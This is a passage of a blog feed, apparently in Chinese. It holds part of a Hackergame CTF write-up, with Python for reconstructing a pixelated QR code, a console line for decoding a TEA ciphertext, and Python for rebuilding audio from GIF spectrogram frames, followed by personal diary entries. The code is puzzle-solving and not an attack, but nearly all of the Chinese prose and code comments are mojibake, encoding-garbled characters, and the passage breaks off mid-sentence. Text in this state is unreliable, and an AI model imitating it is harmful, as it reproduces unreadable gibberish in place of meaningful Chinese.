class="built_in">range</span>(SIZE//QRBLOCK)] <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(SIZE//QRBLOCK)]</span><br><span class="line">kimeta =  [[<span class="number">0</span> <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(SIZE//QRBLOCK)] <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(SIZE//QRBLOCK)]<span class="comment">#é’¦å®šäº†</span></span><br><span class="line">EACH = <span class="built_in">int</span>(math.ceil(MSBLOCK/QRBLOCK)) <span class="comment">#EACH=3</span></span><br><span class="line">filename = <span class="string">&#x27;pixelated_qrcode.bmp&#x27;</span></span><br><span class="line">data = ImageToMatrix(filename)</span><br><span class="line">np.set_printoptions(threshold=<span class="number">1145141919810</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,SIZE):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,SIZE):</span><br><span class="line">            pre_arr[i][j]=data[i].tolist()[<span class="number">0</span>][j]</span><br><span class="line">            <span class="keyword">if</span> i%QRBLOCK==<span class="number">0</span> <span class="keyword">and</span> j%QRBLOCK==<span class="number">0</span>:</span><br><span class="line">                res_arr[i//QRBLOCK][j//QRBLOCK]=<span class="built_in">int</span>(data.tolist()[i][j])</span><br><span class="line"><span class="comment"># print(pre_arr)</span></span><br><span class="line"><span class="keyword">def</span>  <span class="title function_">check</span>(<span class="params">i,j,now</span>):</span><br><span class="line">    <span class="keyword">if</span> i&lt;=<span class="number">9</span> <span class="keyword">or</span> i&gt;=<span class="number">51</span> <span class="keyword">or</span> j&lt;=<span class="number">12</span> <span class="keyword">or</span> j&gt;=<span class="number">54</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (pre_arr[i*QRBLOCK+<span class="number">3</span>][j*QRBLOCK+<span class="number">3</span>] == now):<span class="comment">#éšä¾¿å†™çš„offset</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> (kimeta[i][j] <span class="keyword">or</span> vis[i][j]) <span class="keyword">and</span> res_arr[i][j]!=now:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getRange</span>(<span class="params">i,j</span>):</span><br><span class="line">    <span class="keyword">return</span> i*QRBLOCK,j*QRBLOCK,(i+<span class="number">1</span>)*QRBLOCK-<span class="number">1</span>,(j+<span class="number">1</span>)*QRBLOCK-<span class="number">1</span> <span class="comment">#x1,y1,x2,y2</span></span><br><span class="line"></span><br><span class="line">vis =  [[<span class="number">0</span> <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(SIZE//QRBLOCK)] <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(SIZE//QRBLOCK)]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calcDelta</span>(<span class="params">Mi,Mj,fillN,comp,LUR,LUC</span>):</span><br><span class="line">    fn = fillN</span><br><span class="line">    <span class="keyword">for</span> xx <span class="keyword">in</span> <span class="built_in">range</span>(LUR,LUR+EACH) :</span><br><span class="line">        <span class="keyword">for</span> yy <span class="keyword">in</span> <span class="built_in">range</span>(LUC,LUC+EACH):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(xx,yy,fn&amp;<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="number">114514</span></span><br><span class="line">            fn = fn&gt;&gt;<span class="number">1</span></span><br><span class="line">    avr = <span class="number">0</span></span><br><span class="line">    qx1,qy1,qx2,qy2 = X+Mi*MSBLOCK,Y+Mj*MSBLOCK,X+(Mi+<span class="number">1</span>)*MSBLOCK-<span class="number">1</span>,Y+(Mj+<span class="number">1</span>)*MSBLOCK-<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(LUR,LUR+EACH) :</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(LUC,LUC+EACH):</span><br><span class="line">            <span class="keyword">if</span> (fillN&amp;<span class="number">1</span>):</span><br><span class="line">                x1,y1,x2,y2 = getRange(x,y)</span><br><span class="line">                inx1,iny1,inx2,iny2 = <span class="built_in">max</span>(x1,qx1),<span class="built_in">max</span>(y1,qy1),<span class="built_in">min</span>(x2,qx2),<span class="built_in">min</span>(y2,qy2)</span><br><span class="line">                avr = avr + (iny2-iny1+<span class="number">1</span>)*(inx2-inx1+<span class="number">1</span>)</span><br><span class="line">            fillN = fillN &gt;&gt; <span class="number">1</span></span><br><span class="line">    newres = avr/(MSBLOCK*MSBLOCK)</span><br><span class="line">    <span class="keyword">if</span> (newres &lt; comp-<span class="number">0.1</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1919810</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">abs</span>(math.floor((avr/(MSBLOCK*MSBLOCK))*<span class="number">255</span>)/<span class="number">255</span>-comp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">putRec</span>(<span class="params">i,j</span>):<span class="comment">#æ”¾ç½®è¯†åˆ«ç å—</span></span><br><span class="line">    kimeta[i][j]=<span class="number">1</span></span><br><span class="line">    res_arr[i][j]=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    kimeta[i][j+<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    res_arr[i][j+<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    kimeta[i][j-<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    res_arr[i][j-<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    kimeta[i+<span class="number">1</span>][j]=<span class="number">1</span></span><br><span class="line">    res_arr[i+<span class="number">1</span>][j]=<span class="number">1</span></span><br><span class="line">    kimeta[i-<span class="number">1</span>][j]=<span class="number">1</span></span><br><span class="line">    res_arr[i-<span class="number">1</span>][j]=<span class="number">1</span></span><br><span class="line">    kimeta[i+<span class="number">1</span>][j+<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    res_arr[i+<span class="number">1</span>][j+<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    kimeta[i-<span class="number">1</span>][j-<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    res_arr[i-<span class="number">1</span>][j-<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    kimeta[i+<span class="number">1</span>][j-<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    res_arr[i+<span class="number">1</span>][j-<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    kimeta[i-<span class="number">1</span>][j+<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    res_arr[i-<span class="number">1</span>][j+<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(i-<span class="number">2</span>,i+<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(j-<span class="number">2</span>,j+<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">abs</span>(x-i)==<span class="number">2</span> <span class="keyword">or</span> <span class="built_in">abs</span>(y-j)==<span class="number">2</span>:</span><br><span class="line">                kimeta[x][y]=<span class="number">1</span></span><br><span class="line">                res_arr[x][y]=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">putRec(<span class="number">28</span>,<span class="number">28</span>)</span><br><span class="line">putRec(<span class="number">28</span>,<span class="number">50</span>)</span><br><span class="line">putRec(<span class="number">50</span>,<span class="number">50</span>)</span><br><span class="line">putRec(<span class="number">50</span>,<span class="number">28</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>,<span class="number">52</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>,<span class="number">55</span>):</span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">9</span> <span class="keyword">or</span> i==<span class="number">51</span> <span class="keyword">or</span> j==<span class="number">12</span> <span class="keyword">or</span> j==<span class="number">54</span>:</span><br><span class="line">            kimeta[i][j]=<span class="number">1</span></span><br><span class="line">            res_arr[i][j]=pre_arr[i*QRBLOCK+<span class="number">3</span>][j*QRBLOCK+<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">new_arr =  [[<span class="number">1</span> <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(SIZE)] <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(SIZE)]</span><br><span class="line">fked =  [[<span class="number">0</span> <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)] <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line"></span><br><span class="line">cntt = <span class="number">0</span></span><br><span class="line">savecnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">i,j</span>):<span class="comment">#ä»é©¬èµ›å…‹å—çš„iè¡Œjåˆ—å¼€å§‹</span></span><br><span class="line">    <span class="keyword">global</span> cntt,savecnt</span><br><span class="line">    cntt = cntt+<span class="number">1</span></span><br><span class="line">    LUR , LUC= (X+i*MSBLOCK)//QRBLOCK , (Y+j*MSBLOCK)//QRBLOCK</span><br><span class="line">    <span class="comment">#è½åœ¨å“ªä¸ªäºŒç»´ç æ–¹å—ä¸Š</span></span><br><span class="line">    <span class="keyword">if</span> (cntt==<span class="number">200000</span>):<span class="comment">#ä¿å­˜ä¸­é€”ç»“æœ</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,SIZE):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,SIZE):</span><br><span class="line">                    new_arr[i][j]=res_arr[i//QRBLOCK][j//QRBLOCK]</span><br><span class="line">        MatrixToImage(np.array(new_arr)).save(<span class="string">&#x27;mid%s.bmp&#x27;</span>%savecnt)</span><br><span class="line">        savecnt = savecnt + <span class="number">1</span></span><br><span class="line">        cntt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> i&lt;<span class="number">0</span> <span class="keyword">or</span> i&gt;=<span class="number">20</span> <span class="keyword">or</span> j&lt;<span class="number">0</span> <span class="keyword">or</span> j&gt;=<span class="number">20</span> <span class="keyword">or</span> fked[i][j]:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    fked[i][j]=<span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    nowMin , nowSol = <span class="number">114514191981.0</span> , (<span class="number">1</span>&lt;&lt;(EACH*EACH))-<span class="number">1</span></span><br><span class="line">    tmpp =  [[<span class="number">0</span> <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)] <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(LUR,LUR+EACH) :</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(LUC,LUC+EACH):</span><br><span class="line">            tmpp[x-LUR][y-LUC]=vis[x][y]</span><br><span class="line">    <span class="keyword">for</span> filN <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1</span>&lt;&lt;(EACH*EACH)):<span class="comment">#æšä¸¾æ¯ä¸ªé©¬èµ›å…‹å—å½±å“åˆ°çš„3*3=9ä¸ªQRå—</span></span><br><span class="line">        tmp = calcDelta(i, j, filN, pre_arr[X+i*MSBLOCK+<span class="number">2</span>][Y+j*MSBLOCK+<span class="number">2</span>],LUR,LUC)<span class="comment">#åŒæ ·æ˜¯ä¹±å†™çš„offset+2</span></span><br><span class="line">        <span class="keyword">if</span> tmp &lt; <span class="number">0.00000001</span>:</span><br><span class="line">            nowSol = filN</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(LUR,LUR+EACH) :</span><br><span class="line">                <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(LUC,LUC+EACH):</span><br><span class="line">                    vis[x][y] = <span class="number">1</span></span><br><span class="line">                    res_arr[x][y]=nowSol&amp;<span class="number">1</span></span><br><span class="line">                    nowSol = nowSol&gt;&gt;<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> ((i+<span class="number">1</span>&lt;<span class="number">20</span> <span class="keyword">and</span> (<span class="keyword">not</span> fked[i+<span class="number">1</span>][j]) <span class="keyword">and</span> dfs(i+<span class="number">1</span>,j)) <span class="keyword">or</span> (j+<span class="number">1</span>&lt;<span class="number">20</span> <span class="keyword">and</span> (<span class="keyword">not</span> fked[i][j+<span class="number">1</span>]) <span class="keyword">and</span> dfs(i,j+<span class="number">1</span>)) <span class="keyword">or</span> (i-<span class="number">1</span>&gt;=<span class="number">0</span> <span class="keyword">and</span> (<span class="keyword">not</span> fked[i-<span class="number">1</span>][j]) <span class="keyword">and</span> dfs(i-<span class="number">1</span>,j)) <span class="keyword">or</span> (j-<span class="number">1</span>&gt;=<span class="number">0</span> <span class="keyword">and</span> (<span class="keyword">not</span> fked[i][j-<span class="number">1</span>]) <span class="keyword">and</span> dfs(i,j-<span class="number">1</span>))):</span><br><span class="line">                fked[i][j]=<span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(LUR,LUR+EACH) :</span><br><span class="line">                    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(LUC,LUC+EACH):</span><br><span class="line">                        vis[x][y] = tmpp[x-LUR][y-LUC]</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            </span><br><span class="line">    fked[i][j]=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(LUR,LUR+EACH) :</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(LUC,LUC+EACH):</span><br><span class="line">            vis[x][y] = tmpp[x-LUR][y-LUC]</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment">#é¢„å…ˆæ‰«æï¼ŒæŠŠèƒ½ç¡®å®šçš„ã€æ²¡æœ‰å¤šè§£çš„å…ˆå¡«ä¸Š</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">        LUR , LUC= (X+i*MSBLOCK)//QRBLOCK , (Y+j*MSBLOCK)//QRBLOCK</span><br><span class="line">        succnt = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> filN <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1</span>&lt;&lt;(EACH*EACH)):</span><br><span class="line">                tmp = calcDelta(i, j, filN, pre_arr[X+i*MSBLOCK+<span class="number">2</span>][Y+j*MSBLOCK+<span class="number">2</span>],LUR,LUC)</span><br><span class="line">                <span class="keyword">if</span> tmp &lt; <span class="number">0.00000001</span>:</span><br><span class="line">                    succnt = succnt + <span class="number">1</span></span><br><span class="line">                    nowSol = filN</span><br><span class="line">        <span class="keyword">if</span> succnt == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(LUR,LUR+EACH) :</span><br><span class="line">                <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(LUC,LUC+EACH):</span><br><span class="line">                    kimeta[x][y] = <span class="number">1</span></span><br><span class="line">                    res_arr[x][y]=nowSol&amp;<span class="number">1</span></span><br><span class="line">                    nowSol = nowSol&gt;&gt;<span class="number">1</span></span><br><span class="line">dfs(<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,SIZE):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,SIZE):</span><br><span class="line">        new_arr[i][j]=res_arr[i//QRBLOCK][j//QRBLOCK]</span><br><span class="line">MatrixToImage(np.array(new_arr)).save(<span class="string">&#x27;resu.bmp&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆæ•ˆæœï¼š<img src="https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030160204036-1937509495.jpg" alt="QRCode"></p><hr><h2 id="minecRaft"><a href="#minecRaft" class="headerlink" title="minecRaft"></a>minecRaft</h2><p>webÃ— reverseâˆš<br>æ‰“å¼€ç½‘é¡µæŸ¥çœ‹jsï¼Œæ‰¾åˆ°flag.jsï¼Œåœ¨<a href="http://jsnice.org/">jsnice.org</a>åæ··æ·†åè‡ªå·±æ‰‹åŠ¨å†æ›¿æ¢ä¸‹å‡ ä¸ªè¿·äººçœ¼çš„å¸¸é‡ï¼Œä¹‹åè¿›è¡Œä»£ç å®¡è®¡ï¼Œä¼šå‘ç°è¿™æ˜¯ä¸ªTEAåŠ å¯†ã€‚å¦‚ä½•å‘ç°æ˜¯TEAå‘¢ï¼Ÿæˆ‘æœäº†å¥½ä¹…ï¼Œåæ¥æœ‰äººå‘Šè¯‰æˆ‘åªéœ€è¦æœå¸¸é‡å°±è¡Œï¼ˆè¿˜éœ€è¦å­¦ä¹ ä¸€ä¸ªäººç”Ÿç»éªŒï¼‰ã€‚<br>æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²sï¼Œä½¿å¾—s.encrypt(â€œ{é‚£ä¸²æ•°å­—å¯†é’¥}â€)&#x3D;&#x3D;&#x3D; â€œ6fâ€¦â€¦0câ€<br>æŠŠå¯†æ–‡åˆ‡ç‰‡é¿å…è½¬æ¢åæ•°å­—è¿‡å¤§ï¼Œåœ¨é¢˜ç›®é¡µé¢ä¸‹<code>F12</code>ï¼Œè¿›å…¥Consoleé‡Œæ‰§è¡Œï¼š</p><pre><code class="javascript">window.btoa(LongToStr4(Base16ToLong(&#39;6fbde674&#39;))+LongToStr4(Base16ToLong(&#39;819a59bf&#39;))+LongToStr4(Base16ToLong(&#39;a1209256&#39;))+LongToStr4(Base16ToLong(&#39;5b4ca2a7&#39;))+LongToStr4(Base16ToLong(&#39;a11dc670&#39;))+LongToStr4(Base16ToLong(&#39;c678681d&#39;))+LongToStr4(Base16ToLong(&#39;af4afb67&#39;))+LongToStr4(Base16ToLong(&#39;04b82f0c&#39;)))</code></pre><p>å¾—åˆ°å¯†æ–‡dOa9b79ZmoFWkiChp6JMW3DGHaEdaHjGZ&#x2F;tKrwwvuAQ&#x3D;<br>è°·æ­Œ<code>TEA decryption online</code>ï¼Œè¿›å…¥<a href="https://www.mefancy.com/obfuscation/encryption-generator.php">https://www.mefancy.com/obfuscation/encryption-generator.php</a>æŠŠä¸Šé¢é‚£ä¸²æ•°å­—å¯†é’¥ï¼ˆ13â€¦ï¼‰è¿˜æœ‰å¯†æ–‡ä¸¢è¿›å»å°±å‡ºflagäº†ã€‚</p><hr><h2 id="pğŸ˜­q"><a href="#pğŸ˜­q" class="headerlink" title="pğŸ˜­q"></a>pğŸ˜­q</h2><p>è€å¤–å¤§å¥¥æµæ³ª.gif  æ—©çŸ¥é“ï¼Œè¿˜æ˜¯åŸé“.jpg<br>å…ˆæŠŠgifçš„å¸§æå–å‡ºæ¥æ–¹ä¾¿å¤„ç†ï¼š</p><pre><code class="python">import osimport sysfrom PIL import Imagedef extractFrames(inGif, outFolder):    frame = Image.open(inGif)    nframes = 0    while frame:        frame.save(&#39;./dest/%s.png&#39; % (nframes))        nframes += 1        try:            frame.seek(nframes)        except EOFError:            break;    return Trueif __name__ == &#39;__main__&#39;:    image = os.path.abspath(sys.argv[1])    dest = os.path.join(os.path.dirname(image), &quot;dest&quot;)    if not os.path.exists(dest):        os.mkdir(dest)    extractFrames(image, dest)</code></pre><p>ç„¶ååŸé¢˜ç»™å•¥åº“å°±ç”¨å•¥åº“ï¼Œé€†å›å»ï¼š</p><pre><code class="python">from array2gif import write_gif  # version: 1.0.4import librosa  # version: 0.8.1import numpy as np  # version: 1.19.5import soundfile as sffrom PIL import Imageimport matplotlib.pyplot as pltdef ImageToMatrix(filename):    im = Image.open(filename)    height,width = im.size    im = im.convert(&#39;L&#39;)    data = im.getdata()    data = np.matrix(data,dtype=&#39;float&#39;)/255.0    new_data = np.reshape(data,(width,height))    return new_datanp.set_printoptions(threshold=1145141919810)num_freqs = 32quantize = 2min_db = -60max_db = 30fft_window_size = 2048frame_step_size = 512window_function_type = &#39;hann&#39;red_pixel = [255, 0, 0]white_pixel = [255, 255, 255]sample_rate = 22050lis =  [[0.0 for col in range(587)] for row in range(32)]imgg = [[0.0 for col in range(130)] for row in range(92)]for ii in range (0,587):    filename = &#39;./dest/%s.png&#39;%ii    print(filename)    data = ImageToMatrix(filename)    for i in range(0,92):        for j in range(0,130):            imgg[i][j]=data.tolist()[i][j]    for xpos in range(0,32):        for scan in range(0,92):            if imgg[scan][xpos*4+2]&lt;1.0:                  lis[xpos][ii]=float((91-scan)-60)                breakspectrogram =  np.array(lis)audio_signal = librosa.feature.inverse.mel_to_audio(librosa.db_to_power(spectrogram), sr=sample_rate, n_fft=fft_window_size*2, hop_length=frame_step_size, window=window_function_type)sf.write(&#39;newnew.wav&#39;, audio_signal, sample_rate) </code></pre><p>æœ€ååœ¨Adobe Audition CCé‡Œéšä¾¿å¤„ç†å¤„ç†ï¼Œå‹‰å¼ºèƒ½å¬äº†ï¼Œå¼€å§‹åŠªåŠ›å¬å†™ï¼š<br><code>Theflagis f,l,a,g ......</code>  </p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write-Up </tag>
            
            <tag> Hackergame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æˆ‘èƒ¡æ±‰ä¸‰åˆå›æ¥äº†ï¼</title>
      <link href="/2021/06/24/%E6%88%91%E8%83%A1%E6%B1%89%E4%B8%89%E5%8F%88%E5%9B%9E%E6%9D%A5%E4%BA%86%EF%BC%81/"/>
      <url>/2021/06/24/%E6%88%91%E8%83%A1%E6%B1%89%E4%B8%89%E5%8F%88%E5%9B%9E%E6%9D%A5%E4%BA%86%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>é«˜è€ƒç»“æŸå¿½ç„¶æƒ³èµ·è¿™ç©æ„ã€‚æˆç»©æ²¡å‡ºå‰èµ¶ç´§å†™å†™è¯æ˜æˆ‘è¿˜æ´»ç€ã€‚å½“ç„¶è¿œå¤æ—¶æœŸçš„ä¸­äºŒé€é¡¶åˆçŸ«æ‰é€ ä½œçš„æ–‡ç« è¿˜æ˜¯å¾—ç•™ç€ï¼Œæ¯•ç«Ÿäººè¿˜æ˜¯éœ€è¦ä¸­äºŒä¸€ç‚¹ã€‚å¤äººå§è–ªå°èƒ†ï¼Œæˆ‘æ²¡é‚£èƒ½åŠ›ä¹Ÿæ²¡æ–‡é‡‡ï¼Œåªèƒ½ä»¥ä¸­äºŒä¹‹æ–‡ç« è­¦é†’è‡ªæˆ‘å®ç°ä¸­äºŒä¹‹äº‹ä¸šã€‚<br>å¸Œæœ›å¯ä»¥æˆä¸ºåƒå†ˆéƒ¨ä¼¦å¤ªéƒé‚£æ ·çš„äººï¼<br>å¯æ˜¯ä»–ä¹Ÿæ˜¯ç°å……ã€‚è‡ªé—­äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>éšç¬”2020.1.17</title>
      <link href="/2020/01/17/%E9%9A%8F%E7%AC%942020.1.17/"/>
      <url>/2020/01/17/%E9%9A%8F%E7%AC%942020.1.17/</url>
      
        <content type="html"><![CDATA[<p>æœŸæœ«è€ƒæˆç»©å‡ºäº†ã€‚å°˜åŸƒè½å®šï¼Œç„¶åç‚¸äº†ã€‚ä¸è¿‡æˆ‘æ²¡å•¥å¿ƒæƒ…æ³¢åŠ¨ï¼Œé™¤äº†åŒ–å­¦æˆç»©å‡ºæ¥çš„æ—¶å€™æŠ¹äº†æŠŠçœ¼æ³ªå…¶ä»–æ²¡å•¥äº†ï¼Œæ¯•ç«Ÿè€ƒäº†ä¸¤æ¬¡ç­å€’ä¸€ä¹Ÿå¤ªå¯æ‚²äº†ã€‚<br>ä¸è¿‡è¢«å­¦å¾—æŒºå¥½å¯èƒ½æœ‰ä¸€ä¸¤ç§‘å‘æŒ¥å¤±å¸¸çš„äººå¥½å¥½å¾—è†œä¸Šäº†å‡ å‘ï¼Œè¿˜æ˜¯è›®ä¸çˆ½çš„å“ˆå“ˆã€‚<br>ç®—æ˜¯æ„æ–™ä¹‹ä¸­ï¼Œæ¯•ç«Ÿè‡ªå·±ä¹‹å‰å­¦ä¹ æ€åº¦å°±ä¸æ€ä¹ˆæ ·ï¼Œå‡­ä»€ä¹ˆæ¯”å¥½å¥½åŠªåŠ›çš„åŒå­¦è¦è€ƒçš„å¥½ï¼Ÿ<br>æˆ–è®¸æ˜¯å› ä¸ºæœ€è¿‘è€æ˜¯ç†¬å¤œï¼Œæˆ‘å®åœ¨æ˜¯å¤ªå›°äº†ï¼Œåœ¨å…¬äº¤è½¦ä¸Šç¡ç€äº†ã€‚çŒ›ç„¶æŠ¬å¤´å‘ç°è½¦å­æ­£ä½¿å‡ºå…¬äº¤è½¦ç«™ï¼Œæˆ‘å¿™ä¸Šå‰è¯¢é—®å¸æœºï¼šâ€œèƒ½å¼€å¼€é—¨è®©æˆ‘ä¸‹è½¦å—ï¼Ÿâ€<br>æˆ‘å¾—åˆ°äº†å¦å®šçš„å›ç­”ï¼Œè¿™ä¹Ÿæ˜¯åº”è¯¥çš„ã€‚æŠ¬å¤´çœ‹äº†çœ‹å¸æœºå·¥ç‰Œä¸Šçš„äº”ä¸ªå¤§çº¢æ˜Ÿï¼Œåˆæƒ³åˆ°æ˜¯å¸æœºå››å¹³å…«ç¨³çš„é©¾é©¶é£æ ¼è®©æˆ‘æ”¶è·äº†ä¸€æ®µæ„å¤–çš„ç²¾è‡´ç¡çœ ï¼Œæˆ‘è¿˜æœ‰ç‚¹æ„Ÿæ¿€ï¼Ÿ<br>åœ¨è½¦ç«™ç­‰äº†å¥½ä¹…ä¸è§ç­‰çš„è½¦æ¥ã€‚è½¦ç»ˆäºæ¥äº†å´æ ¹æœ¬æ²¡æœ‰åœé ã€‚æˆ‘è¿™æ‰å‘ç°ï¼Œå…¬äº¤å…¬å¸åˆæ”¹çº¿è·¯äº†ï¼Œé‚æ‹›æ¥å‡ºç§Ÿè½¦ï¼Œç ´ç‚¹å°è´¹ã€‚<br>æŠ¥å‡ºç›®çš„åœ°ï¼Œä¸Šè½¦ï¼Œå¸æœºé©¬ä¸Šè·Ÿæˆ‘æ”€è°ˆèµ·æ¥ã€‚ä¸çŸ¥é“æ˜¯ä¸æ˜¯å› ä¸ºç²¾è‡´ç¡çœ çš„ç¼˜æ•…ï¼Œæˆ‘å› ä¸ºæ„Ÿå†’è€Œå˜¶å“‘æ— æ¯”çš„å—“å­çªç„¶å¥½äº†ä¸å°‘ã€‚æ€»ä¹‹å¸æœºä¸»åŠ¨å’Œæˆ‘è°ˆèµ·ä¸ªäººæƒ…å†µï¼Œæˆ‘ä¹Ÿåº”ä»˜æ€§çš„å›å›ï¼Œå½“ç„¶æˆ‘è­¦æˆ’å¿ƒçªç„¶å°±å¾ˆå¼ºï¼Œæ²¡å¿˜æ‰“å¼€å½•éŸ³ã€‚<br>ä»–é—®èµ·æˆ‘çš„å­¦æ ¡ï¼Œæˆ‘çš„å­¦ä¹ ï¼Œæˆ‘çš„è€ƒè¯•ï¼Œæˆ‘ä¹Ÿé…åˆåœ°æŠ–äº†ä¸ªç²¾å…‰ã€‚åæ­£æˆ‘ä¸ªäººã€ä¿¡æ¯éƒ½æ²¡å•¥ä»·å€¼ï¼Œä¹Ÿæ²¡æ³•ç”¨æ¥ä¸å½“å¾—åˆ©ã€‚<br>ä»–èŠèµ·äº†æ–°é«˜è€ƒï¼ŒèŠèµ·äº†ä»–åœ¨æ¸…åçš„ä¾„å­â€”â€”å› ä¸ºåœ¨ä»–è¯¢é—®æˆ‘æ®µæ’çš„æ—¶å€™æˆ‘é¡ºä»ç€è™šè£å¿ƒçš„ä¼Ÿå¤§é¢†å¯¼æŠ¥äº†ä¸ªç•¥é 